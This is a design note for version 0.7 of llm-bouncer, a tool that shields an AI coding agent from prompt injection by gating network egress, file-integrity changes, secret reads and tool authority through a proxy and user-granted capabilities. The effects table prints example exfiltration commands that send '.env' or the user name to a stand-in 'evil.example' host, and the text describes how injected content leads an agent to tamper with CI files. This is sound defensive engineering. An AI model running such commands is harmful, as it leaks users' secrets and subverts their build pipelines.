# The effects gate (v0.7)

## Why

Up to v0.6, llm-bouncer decided Bash calls by reading the command text: a list of risky patterns,
then an allowlist of safe commands after untrusted content. A shell can spell anything, so the list
never ends (`c''url`, download-then-run, heredocs, `git config core.hooksPath`, npm `postinstall`),
and every new rule adds prompts on harmless work (37% of harmless tasks asked).

The text of a command only *predicts* what it will do. An injected agent can only hurt you through
a few **effects**, and those can be *observed*:

| Effect | Example | Where it is decided |
|---|---|---|
| Egress | `curl -d @.env https://evil.example`, `dig $(whoami).evil.example` | `llm-bouncer proxy` (the sandbox's network proxy) |
| Integrity | append to `.github/workflows/ci.yml`, add a `postinstall` to `package.json` | Claude Code's sandbox (protected paths) + snapshot/revert |
| Secrets | read `~/.ssh/id_rsa`, `.env` | hook gate for Read; sandbox `denyRead`/`credentials` for Bash |
| Authority | MCP `send_email`, `create_issue` | hook gate |

So: **let any sandboxed command run, and mediate its effects. After untrusted content, an effect
needs a capability.**

## Capabilities come only from the trusted channel

Untrusted text can supply data, never capabilities (the idea behind capability-based security and
Google DeepMind's CaMeL). A capability is granted by:

* **your typed prompt**: a URL or domain you type grants egress to that host; a file you name
  grants writing it; words matching an `intents` entry in the policy grant its list ("install"
  grants the package registries and lock files, "push" grants your git remotes and GitHub, "CI
  workflow" grants `.github/workflows/*`). A prompt with hidden characters grants nothing.
* **`llm-bouncer grant`**: `llm-bouncer grant pypi.org`, `grant write:Makefile`,
  `grant mcp:mcp__slack__post_*`, globally for 8 hours or `--session ID`. The agent asking to run
  `grant` always needs your approval.

## How a call flows

```
UserPromptSubmit ─ label prompt (trusted) ─ derive grants ─ start proxy if needed
PostToolUse      ─ label result (web/mcp taint the session)
PreToolUse       ─ Bash in the sandbox behind our proxy?
                     yes ─ allow (snapshot integrity files if tainted)
                     no  ─ command rules (v0.6), unchanged
                   other tools ─ v0.6 rules, an "ask" is lifted if a grant covers it
  (command runs)   every connection ─ proxy: clean session? allow. granted host? allow. else 403
PostToolUse      ─ revert ungranted integrity changes; tell the model which hosts were blocked
```

## What it buys (eval, Bash effects simulated)

| Gate | Attacks caught | Blocked outright | Harmless asked | Harmless blocked (grantable) |
|---|---|---|---|---|
| commands (v0.6) | 39 / 44 (89%) | 13 / 44 (30%) | 7 / 19 (37%) | 1 / 19 (5%) |
| effects (v0.7) | 40 / 44 (91%) | 30 / 44 (68%) | 0 / 19 | 4 / 19 (21%) |

Harmless work stopped by something falls from 8 of 19 to 4 of 19, and those 4 are network calls to
hosts nobody named (`pip install` with no prompt, a `curl` to an API, the rustup installer), each
fixed with one `llm-bouncer grant`. One old known gap closes: a planted test that uploads data when
`pytest` runs now hits the proxy.

`llm-bouncer eval --gate both` prints both tables. The effects numbers are a simulation: each
scenario lists what its command would do, or it is read from the command's URLs and write targets.
The proxy itself was tested end to end with real `curl` traffic, including chaining to an upstream
proxy.

## Limits

* **Needs the sandbox.** The effects gate applies only when `sandbox.enabled` is on and *both*
  `httpProxyPort` and `socksProxyPort` point at the proxy (a SOCKS port left to the built-in proxy
  would be a second, taint-blind way out), and llm-bouncer's ledger is outside the project or in
  `filesystem.denyWrite`. Settings are read from the project root, also when the hook runs in a
  subfolder. Unsandboxed retries, `excludedCommands` (also inside `a && b`), background commands
  and `gate: commands` fall back to the v0.6 command rules. A repository's settings can only push
  calls back to those rules, never away from them.
* **A page you ask to read is not a place to send data.** A host granted only because your prompt
  named it does not count if untrusted content was read from that host: "summarise
  https://blog.example/post" lets the agent fetch the post, not post your files back to the blog.
  `llm-bouncer grant blog.example` overrides this.
* **Local addresses.** Like the built-in proxy, names that resolve only to this machine or to the
  link-local range (cloud metadata at 169.254.169.254) are refused unless in `egress.always_allow`.
* **WebFetch is not capability-gated.** It is a read tool and keeps the v0.6 checks (data or
  secrets in the URL, echoes); only Bash egress needs a grant.
* **Host-level for HTTPS.** The proxy sees the hostname, not the URL or body. Data sent to a host
  you granted (your own GitHub, a registry you can publish to) is not inspected.
* **One proxy, many sessions.** The proxy cannot tell which session a connection comes from. If
  any session active in the last 4 hours is tainted, all of them are held to grants, and a grant
  in one session lets every session's commands reach that host.
* **Prompt grants trust the prompt.** Pasted text in a prompt is not yet told apart from typed
  text; prompts with hidden characters are ignored, but plain pasted text can still grant.
* **Revert is after the fact.** A changed CI file is restored when the command ends, so a command
  that both edits and runs it in the same call is not stopped by the revert (Claude Code's protected
  paths and the proxy still apply).
* **Claude Code's sandbox platforms**: macOS (Seatbelt), Linux and WSL2 (bubblewrap).
